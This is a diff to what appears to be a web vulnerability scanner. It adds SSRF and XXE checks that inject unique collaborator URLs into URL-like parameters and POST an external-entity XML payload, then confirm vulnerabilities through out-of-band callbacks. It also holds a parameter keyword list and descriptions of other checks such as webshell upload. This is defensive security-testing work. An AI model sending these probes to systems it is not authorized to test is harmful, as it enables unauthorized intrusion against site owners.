@@ -18,7 +18,7 @@ from dataclasses import replace
 
 import httpx
 
-from . import auth, browser
+from . import auth, browser, oob
 from .net import make_client
 from .schema import Endpoint
 
@@ -605,6 +605,90 @@ def ssti_injectable(ctx, probe) -> bool | None:
             if budget <= 0:
                 break
     return False if tested else None
+
+
+# SSRF + XXE — both detected OUT-OF-BAND via a collaborator listener: inject a unique URL/entity that
+# points back at the runner; a callback proves the target's SERVER made the request. Near-zero false
+# positives (a random one-time URL is only fetched if the server actually requested it).
+def _await_callback(collab, tokens, probe, timeout=2.5):
+    deadline = time.perf_counter() + probe.probe.get("oob_wait", timeout)
+    while time.perf_counter() < deadline:
+        if any(collab.received(t) for t in tokens):
+            return
+        time.sleep(0.2)
+
+
+_SSRF_PARAMS = ("url", "uri", "link", "src", "href", "callback", "webhook", "target", "host", "domain",
+                "site", "feed", "proxy", "fetch", "load", "image", "img", "resource", "dest", "to",
+                "out", "open", "page", "path", "data", "ref", "u", "server", "remote")
+
+
+def ssrf(ctx, probe) -> bool | None:
+    """Server-Side Request Forgery: inject a unique collaborator URL into URL-ish params (url/uri/link/
+    image/...); a callback to the listener proves the server fetched it. N/A when no URL-ish param."""
+    targets = []
+    for f in ctx.profile.forms:
+        fields = [x for x in f.fields if x.lower() in _SSRF_PARAMS]
+        if fields:
+            targets.append((f.action, (f.method or "get").lower(), fields, list(f.fields)))
+    for e in ctx.profile.endpoints:
+        if e.method.lower() == "get":
+            fields = [x for x in e.query_params if x.lower() in _SSRF_PARAMS]
+            if fields:
+                targets.append((e.raw_path, "get", fields, list(e.query_params)))
+    if not targets:
+        return None
+    hosts = oob.callback_hosts()
+    collab = oob.Collaborator()
+    tokens: list[str] = []
+    try:
+        with make_client(ctx.base_url, ctx.headers, timeout=8.0, follow_redirects=True) as c:
+            for action, method, url_fields, all_fields in targets:
+                for field in url_fields:
+                    for host in hosts:
+                        token = "hlssrf" + secrets.token_hex(5)
+                        tokens.append(token)
+                        data = {fn: (collab.url(host, token) if fn == field else _XSS_FILLER) for fn in all_fields}
+                        try:
+                            _xss_send(c, method, action, data)
+                        except (httpx.HTTPError, httpx.InvalidURL):
+                            continue
+        _await_callback(collab, tokens, probe)
+        return True if any(collab.received(t) for t in tokens) else False
+    finally:
+        collab.close()
+
+
+_XXE_PAYLOAD = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "%s">]><r>&xxe;</r>'
+
+
+def xxe(ctx, probe) -> bool | None:
+    """XML External Entity: POST XML declaring an external entity pointing at the collaborator to each
+    POST endpoint; a callback proves the parser resolved it. N/A when there's no POST endpoint."""
+    posts = list(dict.fromkeys(
+        [f.action for f in ctx.profile.forms if (f.method or "").lower() == "post"]
+        + [e.path for e in ctx.profile.endpoints if e.method.lower() == "post"]))
+    if not posts:
+        return None
+    hosts = oob.callback_hosts()
+    collab = oob.Collaborator()
+    tokens: list[str] = []
+    try:
+        with make_client(ctx.base_url, ctx.headers, timeout=8.0, follow_redirects=True) as c:
+            for action in posts:
+                for host in hosts:
+                    token = "hlxxe" + secrets.token_hex(5)
+                    tokens.append(token)
+                    xml = (_XXE_PAYLOAD % collab.url(host, token)).encode()
+                    for ctype in ("application/xml", "text/xml"):
+                        try:
+                            c.post(action, content=xml, headers={"Content-Type": ctype})
+                        except (httpx.HTTPError, httpx.InvalidURL):
+                            continue
+        _await_callback(collab, tokens, probe)
+        return True if any(collab.received(t) for t in tokens) else False
+    finally:
+        collab.close()
 
 
 # Path traversal / local file inclusion — read a file outside the intended directory via a filename
@@ -1220,6 +1304,8 @@ PREDICATES = {
     "xss_injectable": xss_injectable,
     "command_injection": command_injection,
     "ssti_injectable": ssti_injectable,
+    "ssrf": ssrf,
+    "xxe": xxe,
     "path_traversal": path_traversal,
     "file_upload": file_upload,
     "weak_session_id": weak_session_id,
@@ -1263,6 +1349,8 @@ _PREDICATE_REASONS = {
     "xss_injectable": "an input reflects unescaped into HTML (XSS: script / img / svg / attribute / stored)",
     "command_injection": "an input reaches an OS shell (injected command executed: separator / substitution / time-based)",
     "ssti_injectable": "an input is evaluated by a server-side template engine (SSTI -> code execution)",
+    "ssrf": "the server fetched an attacker-supplied URL (server-side request forgery)",
+    "xxe": "the XML parser resolved an external entity to an attacker URL (XXE)",
     "path_traversal": "a filename param served a file outside the web root (path traversal / local file inclusion)",
     "file_upload": "an uploaded webshell was accepted and executed server-side (insecure file upload -> RCE)",
     "weak_session_id": "session identifiers are weak/predictable (short / numeric / sequential)",
